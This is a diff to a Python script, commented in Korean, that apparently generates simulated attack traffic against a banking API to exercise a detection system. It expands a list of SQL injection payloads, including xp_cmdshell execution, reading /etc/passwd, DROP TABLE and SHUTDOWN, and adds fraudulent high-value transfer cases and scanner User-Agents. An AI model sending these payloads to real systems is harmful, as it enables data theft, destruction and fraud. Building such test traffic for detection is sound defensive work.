@@ -102,10 +102,38 @@ SQLI_PAYLOADS = [
     "1; SELECT * FROM users",
     "' OR 'x'='x",
     "\" OR \"1\"=\"1",
+    "' OR ''='",
+    "admin'--",
+    "' UNION SELECT username,password FROM users--",
+    "' UNION SELECT 1,2,3--",
+    "1' OR '1'='1' /*",
+    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+    "'; EXEC xp_cmdshell('dir')--",
+    "' HAVING 1=1--",
+    "' GROUP BY columnnames HAVING 1=1--",
+    "' UNION ALL SELECT NULL,NULL,NULL--",
+    "1' WAITFOR DELAY '0:0:5'--",
+    "' OR EXISTS(SELECT * FROM users)--",
+    "' AND SUBSTRING(username,1,1)='a'--",
+    "'; DROP TABLE users--",
+    "' UNION SELECT NULL,table_name FROM information_schema.tables--",
+    "1 AND 1=1 UNION SELECT 1,2,3--",
+    "' OR 'a'='a",
+    "') OR ('1'='1",
+    "' OR 1=1 LIMIT 1--",
+    "' AND (SELECT COUNT(*) FROM users)>0--",
+    "1'; SELECT * FROM information_schema.tables--",
+    "' UNION SELECT load_file('/etc/passwd')--",
+    "' INTO OUTFILE '/tmp/test.txt'--",
+    "' OR BENCHMARK(10000000,SHA1('test'))--",
+    "'; SHUTDOWN--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
+    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
 ]
 
 
-def attack_sqli(base_url: str, count: int = 12):
+def attack_sqli(base_url: str, count: int = 100):
     """
     SQL Injection 공격을 시뮬레이션한다.
 
@@ -122,7 +150,9 @@ def attack_sqli(base_url: str, count: int = 12):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         "Accept": "application/json",
     }
-    for i, payload in enumerate(SQLI_PAYLOADS[:count]):
+    sent = 0
+    for i in range(count):
+        payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
         try:
             resp = requests.get(
                 f"{base_url}/api/account",
@@ -131,9 +161,11 @@ def attack_sqli(base_url: str, count: int = 12):
                 timeout=5,
             )
             log("GET /api/account [SQLi]", resp.status_code, f"payload={repr(payload)}")
+            sent += 1
         except requests.RequestException as e:
             print(f"  [ERR] {e}")
         time.sleep(0.3)
+    print(f"  완료: SQL Injection {sent}건 전송")
 
 
 # ─────────────────────────────────────────────
@@ -147,10 +179,20 @@ HTA_CASES = [
     {"from_account": "444-55-666666", "to_account": "999-99-999999", "amount": 1_000_000_000, "memo": "wire"},
     {"from_account": "111-22-333333", "to_account": "123-45-678901", "amount": 750_000_000, "memo": ""},
     {"from_account": "444-55-666666", "to_account": "987-65-432100", "amount": 999_000_000, "memo": "transfer"},
+    {"from_account": "111-22-333333", "to_account": "555-66-777777", "amount": 800_000_000, "memo": "loan"},
+    {"from_account": "444-55-666666", "to_account": "222-33-444444", "amount": 650_000_000, "memo": "invest"},
+    {"from_account": "111-22-333333", "to_account": "888-99-000000", "amount": 900_000_000, "memo": ""},
+    {"from_account": "444-55-666666", "to_account": "111-00-222222", "amount": 550_000_000, "memo": "payment"},
+    {"from_account": "111-22-333333", "to_account": "333-44-555555", "amount": 1_500_000_000, "memo": "bulk"},
+    {"from_account": "444-55-666666", "to_account": "777-88-999999", "amount": 2_000_000_000, "memo": "wire"},
+    {"from_account": "111-22-333333", "to_account": "666-77-888888", "amount": 700_000_000, "memo": "urgent"},
+    {"from_account": "444-55-666666", "to_account": "444-55-000000", "amount": 850_000_000, "memo": ""},
+    {"from_account": "111-22-333333", "to_account": "999-00-111111", "amount": 950_000_000, "memo": "transfer"},
+    {"from_account": "444-55-666666", "to_account": "123-99-876543", "amount": 600_000_000, "memo": "deposit"},
 ]
 
 
-def attack_high_transfer(base_url: str):
+def attack_high_transfer(base_url: str, count: int = 100):
     """
     비정상 고액 이체 공격을 시뮬레이션한다.
 
@@ -161,12 +203,14 @@ def attack_high_transfer(base_url: str):
     Args:
         base_url : 요청을 보낼 서버의 베이스 URL
     """
-    section("공격 유형 2: 고액 이체 (POST /api/transfer)")
+    section(f"공격 유형 2: 고액 이체 (POST /api/transfer) × {count}건")
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0)",
         "Content-Type": "application/json",
     }
-    for case in HTA_CASES:
+    sent = 0
+    for i in range(count):
+        case = HTA_CASES[i % len(HTA_CASES)]
         try:
             resp = requests.post(
                 f"{base_url}/api/transfer",
@@ -179,9 +223,11 @@ def attack_high_transfer(base_url: str):
                 resp.status_code,
                 f"amount={case['amount']:,}",
             )
+            sent += 1
         except requests.RequestException as e:
             print(f"  [ERR] {e}")
         time.sleep(0.3)
+    print(f"  완료: 고액 이체 {sent}건 전송")
 
 
 # ─────────────────────────────────────────────
@@ -251,6 +297,20 @@ SCANNER_USER_AGENTS = [
     ("zgrab",  "zgrab/0.x"),
     ("masscan","masscan/1.3"),
     ("burp",   "python-httpx/0.24.0"),
+    ("sqlmap2", "sqlmap/1.8.1#stable (https://sqlmap.org)"),
+    ("nikto2",  "Nikto/2.5.0"),
+    ("nmap2",   "Mozilla/5.0 (compatible; Nmap Scripting Engine)"),
+    ("gobuster", "gobuster/3.6"),
+    ("wfuzz",   "Wfuzz/3.1.0"),
+    ("nuclei",  "Nuclei/3.1.0"),
+    ("ffuf",    "Fuzz Faster U Fool v2.1.0"),
+    ("hydra",   "Mozilla/4.0 (Hydra)"),
+    ("arachni", "Arachni/v1.6.1"),
+    ("openvas", "OpenVAS/22.4"),
+    ("w3af",    "w3af.org"),
+    ("skipfish", "skipfish/2.10b"),
+    ("whatweb",  "WhatWeb/0.5.5"),
+    ("wpscan",   "WPScan v3.8.25"),
 ]
 
 SCAN_TARGETS = [
@@ -260,7 +320,7 @@ SCAN_TARGETS = [
 ]
 
 
-def attack_scanner_ua(base_url: str):
+def attack_scanner_ua(base_url: str, count: int = 100):
     """
     보안 스캐너·공격 도구의 User-Agent를 사용한 요청을 시뮬레이션한다.
 
@@ -270,9 +330,12 @@ def attack_scanner_ua(base_url: str):
 
     Args:
         base_url : 요청을 보낼 서버의 베이스 URL
+        count    : 전송할 요청 개수 (기본값 100)
     """
-    section("공격 유형 4: 의심 User-Agent / 스캐너 모방")
-    for tool_name, ua in SCANNER_USER_AGENTS:
+    section(f"공격 유형 4: 의심 User-Agent / 스캐너 모방 × {count}건")
+    sent = 0
+    for i in range(count):
+        tool_name, ua = SCANNER_USER_AGENTS[i % len(SCANNER_USER_AGENTS)]
         headers = {
             "User-Agent": ua,
             "Accept": "*/*",
@@ -299,9 +362,11 @@ def attack_scanner_ua(base_url: str):
                 resp.status_code,
                 f"ua={ua[:40]}",
             )
+            sent += 1
         except requests.RequestException as e:
             print(f"  [ERR] {tool_name}: {e}")
         time.sleep(0.3)
+    print(f"  완료: 스캐너 UA {sent}건 전송")
 
 
 # ─────────────────────────────────────────────
@@ -337,8 +402,11 @@ def main():
         choices=["all", "sqli", "hta", "brute", "scan"],
         help="공격 유형 선택 (기본: all)",
     )
+    parser.add_argument("--sqli-count", default=100, type=int, help="SQL Injection 요청 횟수")
+    parser.add_argument("--hta-count", default=100, type=int, help="고액 이체 요청 횟수")
     parser.add_argument("--brute-count", default=200, type=int, help="Brute Force 요청 횟수")
     parser.add_argument("--brute-delay", default=0.05, type=float, help="Brute Force 요청 간격(초)")
+    parser.add_argument("--scan-count", default=100, type=int, help="스캐너 UA 요청 횟수")
     args = parser.parse_args()
 
     global BASE_URL
@@ -359,10 +427,10 @@ def main():
 
     try:
         if args.type == "all":
-            attack_sqli(base_url)
-            attack_high_transfer(base_url)
+            attack_sqli(base_url, args.sqli_count)
+            attack_high_transfer(base_url, args.hta_count)
             attack_brute_force(base_url, args.brute_count, args.brute_delay)
-            attack_scanner_ua(base_url)
+            attack_scanner_ua(base_url, args.scan_count)
         elif args.type == "brute":
             attack_brute_force(base_url, args.brute_count, args.brute_delay)
         else:
